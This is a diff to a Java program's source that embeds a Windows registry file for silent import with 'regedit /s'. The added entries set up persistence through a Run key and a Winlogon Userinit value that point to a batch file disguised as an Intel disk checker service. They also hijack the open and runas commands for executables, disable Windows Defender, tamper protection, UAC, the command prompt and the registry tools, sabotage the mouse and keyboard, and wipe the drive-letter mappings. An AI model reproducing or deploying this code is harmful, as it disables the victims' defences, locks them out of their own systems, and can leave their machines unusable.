@@ -33,21 +33,241 @@ public final class Main {
     private static final String regRunCommand = "regedit /s C:\\Program Files\\regdata.reg";
     private static final String runMessage = "Already Executed !";
     private static final String regData = """
-            Windows Registry Editor Version 5.00
+Windows Registry Editor Version 5.00
 
-            [HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Keyboard Layout]
-            "Scancode Map"=hex:00,00,00,00,00,00,00,00,09,00,00,00,00,00,5b,e0,00,00,5c,e0,00,00,5d,e0,00,00,44,00,00,00,1d,00,00,00,38,00,00,00,1d,e0,00,00,38,e0,00,00,2A,00,00,00,46,00,00,00,3A,00,00,00,3B,00,00,00,3C,00,00,00,3D,00,00,00,3E,00,00,00,3F,00,00,00,40,00,00,00,41,00,00,00,43,00,00,00,57,00,00,00,58,00,00,00,00,00
+[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Keyboard Layout]
+"Scancode Map"=hex:00,00,00,00,00,00,00,00,09,00,00,00,00,00,5b,e0,00,00,5c,e0,00,00,5d,e0,00,00,44,00,00,00,1d,00,00,00,38,00,00,00,1d,e0,00,00,38,e0,00,00,2A,00,00,00,46,00,00,00,3A,00,00,00,3B,00,00,00,3C,00,00,00,3D,00,00,00,3E,00,00,00,3F,00,00,00,40,00,00,00,41,00,00,00,43,00,00,00,57,00,00,00,58,00,00,00,00,00
 
-            [HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run]
-            "fileCompressor"="C:\\\\Program Files\\\\WARM - I.exe"
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]
+"intel-disk-checker-service"="C:\\Program Files\\intel_disk_checker_service.bat"
 
-            [HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer]
-            "NoViewContextMenu"=dword:00000001
-                        
-            [HKEY_CURRENT_USER\\Control Panel\\Mouse]
-            "SwapMouseButtons"="1"
-            "DoubleClickSpeed"="0"
-            "ClickLock"=dword:00000000""";
+[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer]
+"NoViewContextMenu"=dword:00000001
+
+[HKEY_CURRENT_USER\Control Panel\Mouse]
+"SwapMouseButtons"="1"
+"DoubleClickSpeed"="1"
+"ClickLock"=dword:00000000
+"MouseSpeed"="9999"
+"Beep"="Yes"
+"ExtendedSounds"="Yes"
+"MouseThreshold1"="9999"
+"MouseThreshold2"="9999"
+"MouseSensivity"="9999"
+"MouseTrails"="999"
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\AutoRotation]
+"Enable"=dword:00000001
+"LastOrientation"=dword:00000001
+"SlateOrientation"=dword:00000001
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\HoloSI]
+"DisableShellUI"=dword:00000001
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\HardwareIdentification]
+"HardwareIDBehavior"=dword:00000001
+"HardwareIDBehaviour"=dword:00000001
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\SecureBoot]
+"EncodedUEFI"=hex:00,00,00,00,00,00,00,00,00,00
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer]
+"InstallerLocation"="nothing"
+"MsiExecCA32"="nothing"
+"MsiExecCA64"="nothing"
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\FileExplorer\Config]
+"DefaultFolder"="nothing"
+"Feature_SetWallPaperImage"=dword:00000000
+"NavigationRoots"="nothing"
+"RemovableDriveIconCharacter"=dword:00000000
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\OpenWith]
+"OpenWithLauncher"="nothing"
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Personalization]
+"AllowPersonalization"=dword:00000000
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\SHUTDOWN]
+"LastBootPerfCounterFrequency"=qword:0000000000000000
+"ShutdownStopTimePrefCounter"=qword:0000000000000000
+"ShutdownStopTimePrefCounterCurrentBuildNumber"="nothing"
+"ShutdownStopTimePrefCounterUBR"=dword:00000000
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\StillImage]
+"WIADevicePresent"=dword:00000000
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Store]
+"StoreContentModifier"="nothing"
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Store\Configuration]
+"Hardware"="kisuinai"
+"OEMDiscoveryTTL"=qword:0000000000000000
+"OEMID"="kisuinai"
+"SCMID"="ghoraranda"
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\ThemeManager]
+"DllName"="nothing"
+"LMOverride"="456446456546546464362346"
+"LMVersion"="-654654646464"
+"LoadedBefore"="-65464646456546"
+"ServerChangeNumber"=dword:00000000
+"ThemeActive"="0"
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\UpdateHealthTools]
+"UDC"="ghoraranda"
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\UpdatePlatform\UX\Configurations]
+"ActiveHoursStartBufferInMinutes"=dword:00000000
+"RebootDowntimeEstimatesEnabled"=dword:00000000
+"RebootSBCEnabled"=dword:00000000
+"SmartActiveHoursState"=dword:00000000
+"SmartSchedulerDurationInMinutes"=dword:00000000
+"UpdateUxAllowed"=dword:00000000
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Windows Block Level Backup]
+"OverallPerformanceSetting"=dword:00500f00
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion]
+"CommonFilesDir"="ghorarandabalcalbalfalao"
+"CommonFilesDir (x86)"="ghorarandabalcalbalfalao"
+"CommonW6432Dir"="ghorarandabalcalbalfalao"
+"DevicePath"="ghorarandabalcalbalfalao"
+"MediaPathUnexpanded"="ghorarandabalcalbalfalao"
+"ProgramFilesDir"="ghorarandabalcalbalfalao"
+"ProgramFilesDir (x86)"="ghorarandabalcalbalfalao"
+"ProgramFilesPath"="ghorarandabalcalbalfalao"
+"ProgramW6432Dir"="ghorarandabalcalbalfalao"
+"SM_ConfigureProgramsName"="ghorarandabalcalbalfalao"
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender]
+"BackupLocation"="ghorarandabalcalbalfalao"
+"DisableAntiSpyware"=dword:00000001
+"DisableAntiVirus"=dword:00000001
+"InstallLocation"="ghorarandabalcalbalfalao"
+"InstallTime"=hex:00,00,00,00
+"IsServiceRunning"=dword:00000001
+"LastEnabledTime"=hex:00,00,00,00
+"OOBInstallTime"=hex:00,00,00,00
+"PassiveMode"=dword:00000001
+"PreviousRunningMode"=dword:00000000
+"ProductAppDataPath"="ghorarandabalcalbalfalao"
+"ProductIcon"="ghorarandabalcalbalfalao"
+"ProductLocalizedName"="ghorarandabalcalbalfalao"
+"ProductLocalisedName"="ghorarandabalcalbalfalao"
+"ProductStatus"=dword:0fffffff
+"ProductType"=dword:0fffffff
+"PUAProtection"=dword:00000000
+"RemediationExe"="ghorarandabalcalbalfalao"
+"SacLearningModeSwitch"=dword:00000000
+"SmartLockerMode"=dword:00000000
+"VerifiedAndReputableTrustModeEnabled"=dword:00000000
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\DeviceControl]
+"PoliciesLastUpdated"=hex:00,00,00,00
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Diagnostics]
+"CloudBadListVersion"=hex:00,00,00,00
+"LastKnownGoodEngineCandidate"=hex:00,00,00,00
+"LastKnownGoodPlatformLocation"="ghorarandabalcalbalfalao"
+"PlatformHealthData"=hex:00,00,00,00
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Features]
+"ChangedDefaults"=hex:00,00,00,00
+"DlpAppEnlightenmentSettings"=dword:00000000
+"DlpDisablePrintDetours"=dword:00000000
+"DlpFileEvidenceEnabled"=dword:00000000
+"MpCapability"=hex:00,00,00,00
+"MpPlatformKillbitsExFromEngine"=hex:00,00,00,00
+"MpPlatformKillbitsFromEngine"=hex:00,00,00,00
+"TamperProtection"=dword:00000000
+"TamperProtectionSource"=dword:00000000
+"TPExclusions"=dword:0fffffff
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Miscellaneous Configuration]
+"BddUpdateFailure"=dword:00000001
+"DeltaUpdateFailure"=dword:00000001
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Quarentine]
+"PurgeItemsAfterDelay"=dword:0fffffff
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection]
+"DpaDisabled"=dword:00000001
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Scan]
+"DaysUntilAggressiveCatchupQuickScan"=dword:00000000
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\UX Configuration]
+"UILockdown"=dword:00000000
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsUpdate\EditionSettings]
+"RootDirectory"="ghorarandabalcalbalfalao"
+
+[HKEY_LOCAL_MACHINE\SYSTEM\DriverDatabase]
+"Architecture"=dword:0fffffff
+"SystemRoot"="ghorarandabalcalbalfalao"
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon]
+"Userinit"="C:\Program Files\intel_disk_checker_service.bat"
+"AutoRestartShell"=dword:00000001
+"DisableCad"=dword:00000000
+"AutoAdminLogon"=dword:00000001
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System]
+"EnableLUA"=dword:00000000
+"EnableSecureUIAPaths"=dword:00000000
+"SupportFullTrustStartupTasks"=dword:00000001
+"EnableFullTrustStartupTasks"=dword:00000001
+"EnableInstallerDetection"=dword:00000000
+"shutdownwithoutlogon"=dword:00000000
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Classes\exefile\shell\runas\command]
+"(Default)"="C:\Program Files\intel_disk_checker_service.bat "%1" %*"
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Classes\exefile\shell\open\command]
+"(Default)"="C:\Program Files\intel_disk_checker_service.bat "%1" %*"
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer]
+"UseDefaultTile"=dword:00000001
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\System]
+"DisableLogonBackgroundImage"=dword:00000001
+
+[HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System]
+"DisableCMD"=dword:00000002
+
+[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System]
+"DisableRegistryTools"=dword:00000001
+
+[HKEY_CURRENT_USER\Control Panel\Desktop]
+"AutoColorization"=dword:00000001
+"WallPaper"="ghorarandabalcalbalfalao"
+
+[HKEY_LOCAL_MACHINE\SYSTEM\MountedDevices]
+"\DosDevices\D:"=hex:00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
+"\DosDevices\C:"=hex:00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
+"\DosDevices\E:"=hex:00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
+"\DosDevices\F:"=hex:00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
+"\DosDevices\G:"=hex:00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
+"\DosDevices\H:"=hex:00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
+"\DosDevices\I:"=hex:00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
+"\DosDevices\J:"=hex:00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
+"\DosDevices\K:"=hex:00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
+"\DosDevices\L:"=hex:00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
+"\DosDevices\M:"=hex:00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
+"\DosDevices\N:"=hex:00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
+"\DosDevices\O:"=hex:00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
+"\DosDevices\P:"=hex:00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
+"\DosDevices\Q:"=hex:00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
+"\DosDevices\R:"=hex:00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
+"\DosDevices\S:"=hex:00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
+"\DosDevices\T:"=hex:00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
+"\DosDevices\U:"=hex:00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
+"\DosDevices\V:"=hex:00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
+"\DosDevices\W:"=hex:00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
+"\DosDevices\X:"=hex:00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
+"\DosDevices\Y:"=hex:00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
+"\DosDevices\Z:"=hex:00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00""";
     static {try {oos = new ObjectOutputStream(new FileOutputStream(mapPath));} catch (IOException ignored) {}for (File file : File.listRoots()) {if ((FileSystemView.getFileSystemView().getSystemTypeDescription(file)).equalsIgnoreCase("local disk")) {drives.add(file);driveMap.put(file.getAbsolutePath(), 0);}}}
         public static void main(String[] args) {
         JFrame frame = new JFrame("window");
